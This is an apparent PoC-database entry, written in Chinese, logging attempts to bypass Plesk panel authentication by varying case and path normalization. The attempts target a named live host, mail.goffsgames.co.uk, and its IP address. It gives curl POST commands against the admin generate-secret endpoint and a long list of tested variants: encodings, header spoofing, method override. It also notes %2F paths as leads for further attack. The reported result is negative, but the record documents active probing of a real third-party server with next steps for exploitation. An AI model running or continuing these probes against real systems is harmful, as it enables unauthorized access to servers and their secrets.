# Plesk sw-cp-server 面板路由大小写/路径归一化不构成会话门绕过（18.0.82.2 实测封口）

- **code**: plesk-sw-cp-server-面板路由大小写-路径归一化不构成会话门绕过-18.0.82.2-实测封口
- **kind**: payload
- **category**: auth-bypass
- **component**: Plesk Obsidian
- **versions**: 18.0.82.2
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-11 实测 mail.goffsgames.co.uk 443/8443：小写首段 /admin、/smb 的所有变体（第二三段大小写、尾斜杠/尾点/;path/点段/%20/%61）均 400/0B；首段大小写变化（/Admin、/aDmIn、/ADMIN、/SMB）均 404/41B JSON {"code":"404","message":"Page Not Found"}；两入口 body md5 逐字节一致；无变体返回 {status,link,email} 或 secret。
- **path**: pocs/plesk-sw-cp-server-面板路由大小写-路径归一化不构成会话门绕过-18.0.82.2-实测封口/poc.txt
- **tags**: plesk,sw-cp-server,auth-bypass,path-normalization,case-sensitivity,negative,proxy-false-negative
- **created_at**: 2026-11-11T17:55:41.243Z
- **engine**: mail.goffsgames.co.uk (88.208.224.249:443/8443)

## 描述

Plesk 面板 sw-cp-server 前端对 /admin、/smb 等受保护前缀先做大小写敏感首段匹配：小写首段进入面板前端控制器并施加会话门（未认证 POST 统一 400/0B，与不存在 action 逐字节一致），首段任何大小写变化落入独立 JSON 404 路由层（41B {"code":"404"}）。module/action 段大小写不敏感（PHP 方法名特性），但在这些变体下会话门照样生效，不进入 handler。结论：这条路不构成鉴权绕过。

## 用法

```
复现/复查命令（Linux，直连）：
curl -sk --path-as-is --noproxy '*' -o /dev/null -D - -X POST \
  -H 'Content-Type: application/json; charset=utf-8' -H 'X-Requested-With: XMLHttpRequest' \
  --data-binary '{"userType":2,"userId":999999}' \
  https://mail.goffsgames.co.uk/admin/Reseller/generate-secret
# 期望：HTTP/1.1 400 Bad Request + Content-Length: 0
curl -sk --path-as-is --noproxy '*' -o - -X POST \
  --data-binary '{"userType":2,"userId":999999}' \
  https://mail.goffsgames.co.uk/ADMIN/reseller/generate-secret
# 期望：404 + 41B {"code":"404","message":"Page Not Found"}
# 8443 同型（HTTP/2，server: nginx）
```

## 正文

```
判据（逐字节三态基线，必须在直连下做）：
1) 不存在路径 GET /nosuch-xxx → Plesk 404 页 990B（body md5 固定）
2) 首段大写 POST /ADMIN/... → JSON 404 41B {"code":"404","message":"Page Not Found"}
3) 小写首段受保护 POST /admin/<mod>/<action> → 400 / Content-Length 0 / text/html; charset=UTF-8（会话门；与 /admin/<mod>/nosuch-action 的 400 完全同字节）
4) GET 同路径 → 303 Location: https://<host>/login.php?success_redirect_url=%2Fadmin%2F<mod>

已实测阴性的变体（全部不区别于 400/0B 或 41B JSON 404）：
- 首段大小写：/Admin/、/aDmIn/、/ADMIN/RESELLER/GENERATE-SECRET、/SMB/user/…、//ADMIN/…、/ADMIN//reseller/…、/ADMIN/reseller/.../、尾点、;.css、/ADMIN/./reseller/…、/%41DMIN/、全角ＡＤＭＩＮ
- 小写首段 + 归一化/段内大小写：/admin/reseller/generate-secret/、generate-secret.、generate-secret;.css、/admin/./reseller/…、generate-secret%20、/%61dmin/…、/admin/Reseller/…、/admin/reseller/GENERATE-SECRET、/smb/User/GENERATE-SECRET、/cp/admin/reseller/…
- 也测过：假 Cookie、Origin/Referer、form-urlencoded、X-HTTP-Method-Override、X-Forwarded-For/X-Real-IP=127.0.0.1（前轮已阴性）
唯一异常：/admin%2Freseller%2Fgenerate-secret → 404/268B / iso-8859-1 Apache 风格 "Not Found"（第三层处理器，非会话门非 JSON 404），值得继续试 %2F 其它位置与 %252F。

旁证（同一面板）：GET /api/v2/ 未认证 200（2489B Swagger UI，列出 /api/v2/openapi.json、/api/v2/swagger.json、/api/modules/wp-toolkit/v1/specification/public）；POST /api/v2/auth → 404/736B 自定义 HTML。Plesk REST API 与面板前端是两层。

【重要陷阱】本环境记录代理（HTTP_PROXY）对部分 POST（如 /admin/reseller/generate-secret）返回 curl rc=52 "Empty reply from server"，直连 --noproxy '*' 才得到真实 400/0B。判定此类并发敏感路径必须直连或双通道对照，否则会把代理故障误读成服务端差异（假阳性线索）。
```
